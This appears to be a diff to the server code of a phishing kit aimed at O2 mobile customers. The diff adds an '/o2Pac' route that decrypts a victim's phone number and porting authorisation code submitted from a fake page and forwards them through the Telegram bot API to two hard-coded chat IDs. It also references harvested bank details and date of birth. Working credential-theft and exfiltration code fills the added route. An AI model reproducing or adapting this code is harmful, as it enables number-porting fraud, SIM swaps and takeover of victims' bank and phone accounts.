@@ -296,10 +296,49 @@ app.post("/o2Triz", (req, res) => {
         .catch((e) => {
           console.log(e);
         });
-      SpoofergooferAP += 1;
 
       res.send("Update Completed");
     });
+});
+
+app.options("/o2Pac", cors());
+
+app.post("/o2Pac", (req, res) => {
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pac = CryptoJS.AES.decrypt(req.body.pac, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  owner = req.body.owner;
+  binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+  var originalText = `+----------- PAC Information ------------+\nTelephone: ${telephone}\nPAC: ${pac}`;
+  axios
+    .post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
+        chat_id: 680379375,
+        text: `O2 PAC:\n${originalText}`,
+        parse_mode: "Markdown",
+      }
+    )
+    .catch((e) => {
+      console.log(e);
+    });
+  axios
+    .post(
+      `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+      {
+        chat_id: "1190384225",
+        text: `O2 PAC:\n${originalText}`,
+        parse_mode: "Markdown",
+      }
+    )
+    .catch((e) => {
+      console.log(e);
+    });
+
+  res.send("Update Completed");
 });
 
 //AUSPOST
